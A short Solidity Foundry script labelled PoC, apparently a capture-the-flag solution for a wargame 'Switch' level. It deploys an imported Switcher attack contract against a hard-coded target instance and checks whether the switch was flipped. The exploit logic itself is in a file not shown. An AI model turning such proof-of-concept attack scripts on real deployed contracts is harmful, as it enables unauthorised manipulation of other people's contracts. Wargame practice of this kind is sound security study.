// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {Switcher} from "../src/29_Switch.sol";

interface ISwitch {
    function switchOn() external view returns (bool);
}

contract PoC is Script {
    address private immutable switchContract =
        0x71d674183F060C9819002181A2cDBa21520D17c2; // Replace with your Switch instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        Switcher switcher = new Switcher(switchContract);

        switcher.toogle();
        console2.log(
            "Is the switch on yet? ",
            ISwitch(switchContract).switchOn()
        );

        vm.stopBroadcast();
    }
}
